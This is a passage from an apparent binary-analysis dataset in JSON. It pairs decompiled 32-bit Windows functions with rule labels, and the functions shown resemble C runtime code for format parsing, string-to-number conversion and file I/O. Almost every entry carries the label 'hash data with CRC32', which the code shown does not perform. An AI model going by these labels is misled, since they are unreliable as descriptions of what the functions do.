arg_14h = fcn.004030f8();\n            arg_10h = fcn.00405911();\n            fcn.00404156(&var_8h, puVar3, arg_10h, arg_14h, uVar4, iVar6, arg_20h, arg_24h, noname_8, arg_2ch, arg_30h);\n            if (((param_1[8] >> 5 & 1) != 0) && (param_1[10] == 0)) {\n                fcn.0040229d(param_1[0xd], param_1[2]);\n            }\n            if (((*(param_1 + 0x32) == 0x67) || (*(param_1 + 0x32) == 0x47)) && ((param_1[8] >> 5 & 1) == 0)) {\n                fcn.00405b23(param_1[0xd], param_1[2]);\n            }\n            pcVar5 = param_1[0xd];\n            cVar2 = *pcVar5;\n            if (cVar2 == '-') {\n                param_1[8] = param_1[8] | 0x40;\n                pcVar5 = pcVar5 + 1;\n                param_1[0xd] = pcVar5;\n                cVar2 = *pcVar5;\n            }\n            if (((cVar2 == 'i') || (cVar2 == 'I')) || ((cVar2 == 'n' || (cVar2 == 'N')))) {\n                param_1[8] = param_1[8] & 0xfffffff7;\n                *(param_1 + 0x32) = 0x73;\n            }\n            pcVar1 = pcVar5 + 1;\n            do {\n                cVar2 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar2 != '\\0');\n            param_1[0xe] = pcVar5 - pcVar1;\n        }\n        uVar4 = 1;\n    }\n    return uVar4;\n}\n",
        "token_count": 1169
    },
    "00404043": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404043(uint16_t *arg_8h, int32_t arg_ch, int32_t *arg_10h, int32_t **arg_14h)\n\n{\n    uint16_t *puVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    int32_t *in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*(*in_ECX + 0xc) >> 0xc & 1) != 0) && (*(*in_ECX + 4) == 0)) {\n        *arg_10h = *arg_10h + arg_ch;\n        return;\n    }\n    piVar4 = *arg_14h;\n    if (piVar4 == NULL) {\n        piVar4 = fcn.004039a4();\n        *arg_14h = piVar4;\n    }\n    iVar2 = *piVar4;\n    *piVar4 = 0;\n    puVar1 = arg_8h + arg_ch;\n    if (arg_8h != puVar1) {\n        do {\n            cVar3 = fcn.00401708(*arg_8h);\n            if (cVar3 == '\\0') {\n                piVar5 = *arg_14h;\n                if (piVar5 == NULL) {\n                    piVar5 = fcn.004039a4();\n                    *arg_14h = piVar5;\n                }\n                if (*piVar5 != 0x2a) {\n                    *arg_10h = -1;\n                    break;\n                }\n                cVar3 = fcn.00401708(0x3f);\n                if (cVar3 != '\\0') goto code_r0x004a7b1e;\n                *arg_10h = -1;\n            }\n            else {\ncode_r0x004a7b1e:\n                *arg_10h = *arg_10h + 1;\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h != puVar1);\n    }\n    if ((*piVar4 == 0) && (iVar2 != 0)) {\n        *piVar4 = iVar2;\n    }\n    return;\n}\n",
        "token_count": 518
    },
    "00405083": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00405083(int32_t param_1)\n\n{\n    int32_t arg_8h;\n    int16_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint unaff_ESI;\n    ushort uVar6;\n    uint16_t uVar7;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    uint var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    uVar7 = *(param_1 + 0x32);\n    if (uVar7 < 0x65) {\n        if (uVar7 == 100) {\ncode_r0x0049f5e3:\n            *(param_1 + 0x20) = *(param_1 + 0x20) | 0x10;\ncode_r0x0049f5e7:\n            arg_ch_00 = 0;\n            arg_8h_00 = 10;\ncode_r0x0049f5ea:\n            cVar5 = fcn.00403ed6(arg_8h_00, arg_ch_00);\n        }\n        else if (uVar7 < 0x59) {\n            if (uVar7 == 0x58) {\n                arg_ch_00 = 1;\ncode_r0x0049f58f:\n                arg_8h_00 = 0x10;\n                goto code_r0x0049f5ea;\n            }\n            if (uVar7 != 0x41) {\n                if (uVar7 == 0x43) goto code_r0x0049f5a3;\n                if (uVar7 < 0x45) goto code_r0x0049f782;\n                if (0x47 < uVar7) {\n                    if (uVar7 != 0x53) goto code_r0x0049f782;\n                    goto code_r0x0049f577;\n                }\n            }\ncode_r0x0049f5f3:\n            cVar5 = fcn.004063d4();\n        }\n        else if (uVar7 == 0x5a) {\n            cVar5 = fcn.00403f35();\n        }\n        else {\n            if (uVar7 == 0x61) goto code_r0x0049f5f3;\n            if (uVar7 != 99) goto code_r0x0049f782;\ncode_r0x0049f5a3:\n            cVar5 = fcn.00404291(0);\n        }\n    }\n    else if (uVar7 < 0x71) {\n        if (uVar7 == 0x70) {\n            cVar5 = fcn.00405867();\n        }\n        else {\n            if (uVar7 < 0x68) goto code_r0x0049f5f3;\n            if (uVar7 == 0x69) goto code_r0x0049f5e3;\n            if (uVar7 == 0x6e) {\n                cVar5 = fcn.00401c26();\n            }\n            else {\n                if (uVar7 != 0x6f) goto code_r0x0049f782;\n                cVar5 = fcn.00405704();\n            }\n        }\n    }\n    else {\n        if (uVar7 != 0x73) {\n            if (uVar7 != 0x75) {\n                if (uVar7 != 0x78) goto code_r0x0049f782;\n                arg_ch_00 = 0;\n                goto code_r0x0049f58f;\n            }\n            goto code_r0x0049f5e7;\n        }\ncode_r0x0049f577:\n        cVar5 = fcn.00402ee1();\n    }\n    if (((cVar5 == '\\0') || (cVar5 = fcn.00403571(),  cVar5 != '\\0')) || (*(param_1 + 0x30) != '\\0'))\n    goto code_r0x0049f782;\n    arg_ch = 0;\n    var_ch = 0;\n    var_8h._0_2_ = 0;\n    uVar2 = *(param_1 + 0x20);\n    var_10h = 0;\n    if ((uVar2 >> 4 & 1) != 0) {\n        if ((uVar2 >> 6 & 1) == 0) {\n            if ((uVar2 & 1) == 0) {\n                if ((uVar2 >> 1 & 1) != 0) {\n                    var_ch = 0x20;\n                    arg_ch = 1;\n                    var_10h = 1;\n                }\n                goto code_r0x0049f68d;\n            }\n            uVar7 = 0x2b;\n        }\n        else {\n            uVar7 = 0x2d;\n        }\n        var_ch = uVar7;\n        var_10h = 1;\n        arg_ch = 1;\n    }\ncode_r0x0049f68d:\n    iVar1 = *(param_1 + 0x32);\n    if (((iVar1 == 0x78) || (iVar1 == 0x58)) && ((uVar2 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar1 == 0x61) || (iVar1 == 0x41)) {\n        bVar4 = true;\n    }\n    else {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        *(&var_ch + arg_ch * 2) = 0x30;\n        if ((iVar1 == 0x58) || (uVar6 = 0x78,  iVar1 == 0x41)) {\n            uVar6 = 0x58;\n        }\n        *(&var_ch + arg_ch * 2 + 2) = uVar6;\n        arg_ch = arg_ch + 2;\n        var_10h = arg_ch;\n    }\n    arg_8h = param_1 + 0x448;\n    arg_10h = (*(param_1 + 0x24) - *(param_1 + 0x38)) - arg_ch;\n    if ((*(param_1 + 0x20) & 0xc) == 0) {\n        fcn.00405afb(arg_8h, 0x20, arg_10h, param_1 + 0x18);\n        arg_ch = var_10h;\n    }\n    fcn.00404043(&var_ch, arg_ch, param_1 + 0x18, param_1 + 0xc);\n    if (((*(param_1 + 0x20) >> 3 & 1) != 0) && ((*(param_1 + 0x20) >> 2 & 1) == 0)) {\n        fcn.00405afb(arg_8h, 0x30, arg_10h, param_1 + 0x18);\n    }\n    fcn.004042aa(0);\n    if ((-1 < *(param_1 + 0x18)) && ((*(param_1 + 0x20) >> 2 & 1) != 0)) {\n        fcn.00405afb(arg_8h, 0x20, arg_10h, param_1 + 0x18);\n    }\ncode_r0x0049f782:\n    fcn.00403085(unaff_ESI);\n    return;\n}\n",
        "token_count": 1766
    },
    "0040407f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Removing unreachable block (ram,0x004bf30d)\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl fcn.0040407f(uint arg_8h, uint8_t *arg_ch, uint8_t **arg_10h, uint32_t arg_14h, uint32_t arg_18h)\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    char cVar3;\n    uint *puVar4;\n    uint8_t *puVar5;\n    uint8_t uVar6;\n    uint32_t extraout_ECX;\n    uint32_t unaff_EBX;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    uint64_t uVar11;\n    int64_t iVar12;\n    int32_t var_3ch;\n    uint var_38h;\n    uint var_30h;\n    uint8_t *var_2ch;\n    uint32_t var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    cVar3 = fcn.00403cfb();\n    if (cVar3 != '\\0') {\n        if ((arg_14h == 0) || ((1 < arg_14h && (arg_14h < 0x25)))) {\n            fcn.004057e5(arg_8h);\n            iVar7 = 0;\n            var_10h = 0;\n            var_2ch = arg_ch;\n            do {\n                puVar5 = arg_ch;\n                uVar6 = *puVar5;\n                uVar8 = unaff_EBX & 0xffffff00;\n                unaff_EBX = uVar8 | uVar6;\n                arg_ch = puVar5 + 1;\n                var_ch = var_ch & 0xffffff00 | uVar6;\n                var_1h._0_1_ = uVar6;\n                iVar10 = fcn.00403cb0(uVar6, 8, &var_38h);\n            } while (iVar10 != 0);\n            var_8h = arg_18h & 0xff;\n            if (uVar6 == 0x2d) {\n                var_8h = var_8h | 2;\ncode_r0x004bf1e5:\n                var_1h._0_1_ = *arg_ch;\n                unaff_EBX = uVar8 | var_1h;\n                arg_ch = puVar5 + 2;\n                var_ch = var_ch & 0xffffff00 | var_1h;\n            }\n            else if (uVar6 == 0x2b) goto code_r0x004bf1e5;\n            if ((arg_14h == 0) || (arg_14h == 0x10)) {\n                cVar3 = unaff_EBX;\n                if (cVar3 - 0x30U < 10) {\n                    iVar10 = cVar3 + -0x30;\n                }\n                else if (cVar3 + 0x9fU < 0x1a) {\n                    iVar10 = cVar3 + -0x57;\n                }\n                else if (cVar3 + 0xbfU < 0x1a) {\n                    iVar10 = cVar3 + -0x37;\n                }\n                else {\n                    iVar10 = -1;\n                }\n                if (iVar10 == 0) {\n                    uVar6 = *arg_ch;\n                    var_18h = var_18h & 0xffffff00 | uVar6;\n                    if ((uVar6 == 0x78) || (uVar6 == 0x58)) {\n                        if (arg_14h == 0) {\n                            arg_14h = 0x10;\n                        }\n                        var_1h._0_1_ = arg_ch[1];\n                        var_ch = var_ch & 0xffffff00 | var_1h;\n                        arg_ch = arg_ch + 2;\n                    }\n                    else {\n                        if (arg_14h == 0) {\n                            arg_14h = 8;\n                        }\n                        fcn.00402dce(var_18h);\n                        arg_ch = arg_ch + 1;\n                    }\n                }\n                else if (arg_14h == 0) {\n                    arg_14h = 10;\n                }\n            }\n            var_24h = arg_14h >> 0x1f;\n            var_28h = arg_14h;\n            uVar11 = fcn.00401820(0xffffffff, 0xffffffff, arg_14h, var_24h, unaff_EBX);\n            uVar1 = var_10h;\n            uVar8 = var_8h;\n            var_20h = extraout_ECX;\n            var_1ch = unaff_EBX;\n            uVar6 = var_1h;\n            while( true ) {\n                iVar10 = uVar1 >> 0x20;\n                var_10h = uVar1;\n                if (uVar6 - 0x30 < 10) {\n                    var_8h = uVar6 - 0x30;\n                }\n                else if (uVar6 + 0x9f < 0x1a) {\n                    var_8h = uVar6 - 0x57;\n                }\n                else if (uVar6 + 0xbf < 0x1a) {\n                    var_8h = uVar6 - 0x37;\n                }\n                else {\n                    var_8h = 0xffffffff;\n                }\n                if ((var_8h == 0xffffffff) || (arg_14h <= var_8h)) break;\n                uVar9 = uVar8 | 8;\n                if ((uVar1 < uVar11) || ((uVar1 == uVar11 && ((var_1ch != 0 || (var_8h <= var_20h)))))) {\n                    iVar12 = fcn.0040262b(var_28h, var_24h, uVar1);\n                    var_18h = uVar11 >> 0x20;\n                    var_14h = uVar11;\n                    uVar1 = iVar12 - 0xc;\n                }\n                else {\n                    uVar9 = uVar8 | 0xc;\n                }\n                uVar6 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                var_ch = var_ch & 0xffffff00 | uVar6;\n                uVar8 = uVar9;\n            }\n            var_8h = uVar8;\n            fcn.00402dce(var_ch);\n            iVar2 = var_10h;\n            var_18h = uVar11 >> 0x20;\n            var_14h = uVar11;\n            if ((uVar8 & 8) == 0) {\n                iVar10 = 0;\n                arg_ch = var_2ch;\n            }\n            else {\n                cVar3 = fcn.00403b02(var_8h, var_10h, iVar10);\n                var_18h = uVar11 >> 0x20;\n                var_14h = uVar11;\n                if (cVar3 == '\\0') {\n                    iVar7 = iVar2;\n                    if ((var_8h & 2) != 0) {\n                        iVar7 = -iVar2;\n                        iVar10 = -(iVar10 + (iVar2 != 0));\n                    }\n                }\n                else {\n                    puVar4 = fcn.004039a4();\n                    var_18h = uVar11 >> 0x20;\n                    var_14h = uVar11;\n                    *puVar4 = 0x22;\n                    if ((var_8h & 1) == 0) {\n                        iVar10 = -1;\n                        iVar7 = -1;\n                    }\n                    else if ((var_8h & 2) == 0) {\n                        iVar7 = -1;\n                        iVar10 = 0x7fffffff;\n                    }\n                    else {\n                        iVar10 = -0x80000000;\n                    }\n                }\n            }\n            if (var_30h != '\\0') {\n                *(var_3ch + 0x350) = *(var_3ch + 0x350) & 0xfffffffd;\n            }\n            goto code_r0x004bf178;\n        }\n        puVar4 = fcn.004039a4();\n        *puVar4 = 0x16;\n        fcn.00403751();\n    }\n    iVar7 = 0;\n    iVar10 = 0;\ncode_r0x004bf178:\n    if (arg_10h != NULL) {\n        *arg_10h = arg_ch;\n    }\n    return CONCAT44(iVar10, iVar7);\n}\n",
        "token_count": 2001
    },
    "0040411f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nuint __cdecl fcn.0040411f(uint arg_8h)\n\n{\n    int32_t lpCriticalSection;\n    uint *puVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00402289(0x56b018, 0x10);\n    lpCriticalSection = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x20) = lpCriticalSection;\n    if (lpCriticalSection == 0) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n    }\n    else {\n        *(unaff_EBP + -0x1c) = 0;\n        fcn.004013f7(lpCriticalSection);\n        *(unaff_EBP + -4) = 0;\n        if ((*(lpCriticalSection + 0xc) >> 0xc & 1) != 0) {\ncode_r0x004ae3ae:\n            uVar2 = fcn.00403116(lpCriticalSection);\n            *(unaff_EBP + -0x1c) = uVar2;\n            *(unaff_EBP + -4) = 0xfffffffe;\n            fcn.004ae3db();\n            goto code_r0x004ae3c8;\n        }\n        uVar3 = fcn.00405f06(lpCriticalSection);\n        if ((uVar3 == 0xffffffff) || (uVar3 == 0xfffffffe)) {\n            iVar5 = 0x56cf68;\n        }\n        else {\n            iVar5 = (uVar3 & 0x3f) * 0x38 + *((uVar3 >> 6) * 4 + 0x570220);\n        }\n        iVar4 = 0x56cf68;\n        if (*(iVar5 + 0x29) == '\\0') {\n            if ((uVar3 != 0xffffffff) && (uVar3 != 0xfffffffe)) {\n                iVar4 = (uVar3 & 0x3f) * 0x38 + *((uVar3 >> 6) * 4 + 0x570220);\n            }\n            if ((*(iVar4 + 0x2d) & 1) == 0) goto code_r0x004ae3ae;\n        }\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n        fcn.00402e7d(0x56cca8, unaff_EBP + -0x10, 0xfffffffe);\n    }\n    uVar2 = 0xffffffff;\ncode_r0x004ae3c8:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar2;\n}\n",
        "token_count": 705
    },
    "004621eb": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004621eb(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::exception.0;\n    fcn.00405a60(in_ECX + 1);\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "00404188": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00404188(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    code **ppcVar2;\n    int32_t unaff_EBP;\n    bool bVar3;\n    uint var_44h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar4;\n    \n    uVar4 = 0x38;\n    fcn.004030e9();\n    piVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar2 = fcn.004024b9(8, uVar4);\n        *(unaff_EBP + -0x10) = ppcVar2;\n        *(unaff_EBP + -4) = 0;\n        bVar3 = ppcVar2 == NULL;\n        if (bVar3) {\n            ppcVar2 = NULL;\n        }\n        else {\n            uVar4 = fcn.00406541();\n            fcn.0040465b(uVar4);\n            *ppcVar2 = vtable.std::codecvt_char__char__struct__Mbstatet_.0;\n            ppcVar2[1] = NULL;\n        }\n        *piVar1 = ppcVar2;\n        if (!bVar3) {\n            fcn.00401fb4();\n        }\n    }\n    fcn.0040113b();\n    return;\n}\n",
        "token_count": 357
    },
    "0046ba41": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046ba41(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    \n    fcn.00403b52();\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "004041dd": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004041dd(char *arg_8h, uint32_t arg_ch, uint32_t arg_10h, int32_t *arg_14h)\n\n{\n    uint32_t *puVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint arg_8h_00;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    char *arg_ch_00;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    if ((arg_ch != 0) && (arg_10h != 0)) {\n        if ((arg_14h != NULL) && ((arg_8h != NULL && (arg_10h <= 0xffffffff / arg_ch)))) {\n            puVar1 = arg_14h + 3;\n            if ((*puVar1 & 0x4c0) == 0) {\n                var_4h = 0x1000;\n            }\n            else {\n                var_4h = arg_14h[6];\n            }\n            uVar6 = arg_ch * arg_10h;\n            do {\n                if (uVar6 == 0) {\n                    return arg_10h;\n                }\n                if (((arg_14h[3] & 0xc0U) == 0) || (arg_14h[2] == 0)) {\n                    if (var_4h <= uVar6) {\n                        if (((arg_14h[3] & 0xc0U) != 0) && (iVar3 = fcn.0040420a(arg_14h),  iVar3 != 0))\n                        goto code_r0x004af1c6;\n                        var_8h = uVar6;\n                        if (var_4h != 0) {\n                            var_8h = uVar6 - uVar6 % var_4h;\n                        }\n                        if (0xfffffffd < var_8h) {\n                            var_8h = 0xfffffffe;\n                        }\n                        arg_ch_00 = arg_8h;\n                        uVar4 = var_8h;\n                        arg_8h_00 = fcn.00405f06(arg_14h);\n                        uVar4 = fcn.004024be(arg_8h_00, arg_ch_00, uVar4);\n                        if (uVar4 != 0xffffffff) {\n                            uVar5 = var_8h;\n                            if (uVar4 <= var_8h) {\n                                uVar5 = uVar4;\n                            }\n                            uVar6 = uVar6 - uVar5;\n                            if (var_8h <= uVar4) goto code_r0x004af1a5;\n                        }\ncode_r0x004af1bd:\n                        LOCK();\n                        *puVar1 = *puVar1 | 0x10;\ncode_r0x004af1c6:\n                        return (arg_ch * arg_10h - uVar6) / arg_ch;\n                    }\n                    iVar3 = fcn.004013b1(*arg_8h, arg_14h);\n                    if (iVar3 == -1) goto code_r0x004af1c6;\n                    var_4h = arg_14h[6];\n                    uVar6 = uVar6 - 1;\n                    if (var_4h < 1) {\n                        var_4h = 1;\n                    }\n                    uVar5 = 1;\n                }\n                else {\n                    if (arg_14h[2] < 0) goto code_r0x004af1bd;\n                    if ((arg_14h[3] & 1U) != 0) goto code_r0x004af1c6;\n                    uVar5 = arg_14h[2];\n                    if (uVar6 < arg_14h[2]) {\n                        uVar5 = uVar6;\n                    }\n                    fcn.0040576d(*arg_14h, arg_8h, uVar5);\n                    arg_14h[2] = arg_14h[2] - uVar5;\n                    uVar6 = uVar6 - uVar5;\n                    *arg_14h = *arg_14h + uVar5;\n                }\ncode_r0x004af1a5:\n                arg_8h = arg_8h + uVar5;\n            } while( true );\n        }\n        puVar2 = fcn.004039a4();\n        *puVar2 = 0x16;\n        fcn.00403751();\n    }\n    return 0;\n}\n",
        "token_count": 1013
    },
    "0040420a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040420a(int32_t *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t arg_10h;\n    \n    puVar1 = arg_8h + 3;\n    if (((*puVar1 & 3) == 2) && ((*puVar1 & 0xc0) != 0)) {\n        iVar2 = arg_8h[1];\n        iVar3 = *arg_8h - iVar2;\n        *arg_8h = iVar2;\n        arg_8h[2] = 0;\n        if (0 < iVar3) {\n            arg_10h = iVar3;\n            arg_8h_00 = fcn.00405f06(arg_8h);\n            iVar2 = fcn.004024be(arg_8h_00, iVar2, arg_10h);\n            if (iVar3 != iVar2) {\n                LOCK();\n                *puVar1 = *puVar1 | 0x10;\n                return 0xffffffff;\n            }\n            if ((*puVar1 >> 2 & 1) != 0) {\n                LOCK();\n                *puVar1 = *puVar1 & 0xfffffffd;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 302
    },
    "0046b925": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046b925(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Mpunct_unsigned_short_int_.0;\n    fcn.004043b3();\n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "0046be0b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046be0b(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    \n    fcn.00401cee();\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "004042cd": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.004042cd(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    if ((*(arg_ch + 0xc) >> 0xc & 1) == 0) {\n        iVar1 = fcn.00405f06(arg_ch);\n        iVar3 = 0x56cf68;\n        if ((iVar1 == -1) || (iVar1 = fcn.00405f06(arg_ch),  iVar1 == -2)) {\n            iVar1 = 0x56cf68;\n        }\n        else {\n            iVar1 = fcn.00405f06(arg_ch);\n            uVar2 = fcn.00405f06(arg_ch);\n            iVar1 = *((iVar1 >> 6) * 4 + 0x570220) + (uVar2 & 0x3f) * 0x38;\n        }\n        if ((*(iVar1 + 0x29) != '\\x02') && (*(iVar1 + 0x29) != '\\x01')) {\n            iVar1 = fcn.00405f06(arg_ch);\n            if ((iVar1 != -1) && (iVar1 = fcn.00405f06(arg_ch),  iVar1 != -2)) {\n                iVar1 = fcn.00405f06(arg_ch);\n                uVar2 = fcn.00405f06(arg_ch);\n                iVar3 = *((iVar1 >> 6) * 4 + 0x570220) + (uVar2 & 0x3f) * 0x38;\n            }\n            if (*(iVar3 + 0x28) < '\\0') {\n                iVar1 = fcn.00402a68(&var_10h, &var_ch, 5, arg_8h);\n                if ((iVar1 == 0) && (iVar1 = 0,  0 < var_10h)) {\n                    do {\n                        iVar3 = fcn.0040464c(*(&var_ch + iVar1), arg_ch);\n                        if (iVar3 == -1) break;\n                        iVar1 = iVar1 + 1;\n                    } while (iVar1 < var_10h);\n                }\n                goto code_r0x004c39d7;\n            }\n        }\n        fcn.004c387f(arg_8h, arg_ch);\n    }\n    else {\n        fcn.004c387f(arg_8h, arg_ch);\n    }\ncode_r0x004c39d7:\n    fcn.00403085(var_10h);\n    return;\n}\n",
        "token_count": 633
    },
    "004042f5": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004042f5(uint32_t arg_8h, char **arg_ch)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    char *pcVar3;\n    char *pcVar4;\n    char **ppcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    \n    if ((arg_ch[3] >> 0xc & 1) == 0) {\n        uVar1 = fcn.00405f06(arg_ch);\n        iVar7 = 0x56cf68;\n        if ((uVar1 == 0xffffffff) || (uVar1 == 0xfffffffe)) {\n            iVar6 = 0x56cf68;\n        }\n        else {\n            iVar6 = (uVar1 & 0x3f) * 0x38 + *((uVar1 >> 6) * 4 + 0x570220);\n        }\n        if (*(iVar6 + 0x29) == '\\0') {\n            if ((uVar1 != 0xffffffff) && (uVar1 != 0xfffffffe)) {\n                iVar7 = (uVar1 & 0x3f) * 0x38 + *((uVar1 >> 6) * 4 + 0x570220);\n            }\n            if ((*(iVar7 + 0x2d) & 1) == 0) goto code_r0x004af5eb;\n        }\n        puVar2 = fcn.004039a4();\n        *puVar2 = 0x16;\n        fcn.00403751();\n    }\n    else {\ncode_r0x004af5eb:\n        if ((arg_8h != 0xffffffff) && (((arg_ch[3] & 1) != 0 || ((arg_ch[3] & 6) == 6)))) {\n            pcVar3 = arg_ch[1];\n            if (pcVar3 == NULL) {\n                fcn.00401faf(arg_ch);\n                pcVar3 = arg_ch[1];\n            }\n            ppcVar5 = arg_ch + 3;\n            if (*arg_ch == pcVar3) {\n                if (arg_ch[2] != NULL) {\n                    return 0xffffffff;\n                }\n                *arg_ch = *arg_ch + 1;\n            }\n            pcVar3 = *arg_ch;\n            pcVar4 = pcVar3 + -1;\n            *arg_ch = pcVar4;\n            if ((*ppcVar5 >> 0xc & 1) == 0) {\n                *pcVar4 = arg_8h;\n            }\n            else if (*pcVar4 != arg_8h) {\n                *arg_ch = pcVar3;\n                return 0xffffffff;\n            }\n            arg_ch[2] = arg_ch[2] + 1;\n            LOCK();\n            *ppcVar5 = *ppcVar5 & 0xfffffff7;\n            LOCK();\n            *ppcVar5 = *ppcVar5 | 1;\n            return arg_8h & 0xff;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 679
    },
    "004042fa": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004042fa(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t arg_ch_00;\n    uint32_t arg_8h_00;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00402739(*(in_ECX + 0x2c));\n    var_ch = 0;\n    var_8h = 0;\n    if (var_4h == 1) {\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            cVar1 = fcn.00402e3c(&var_ch);\n        }\n        else {\n            cVar1 = fcn.00405c31(&var_ch);\n        }\n    }\n    else if (var_4h == 2) {\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            cVar1 = fcn.00405349(&var_ch);\n        }\n        else {\n            cVar1 = fcn.00406749(&var_ch);\n        }\n    }\n    else if (var_4h == 4) {\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            cVar1 = fcn.00401de3(&var_ch);\n        }\n        else {\n            cVar1 = fcn.004058bc(&var_ch);\n        }\n    }\n    else {\n        if (var_4h != 8) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 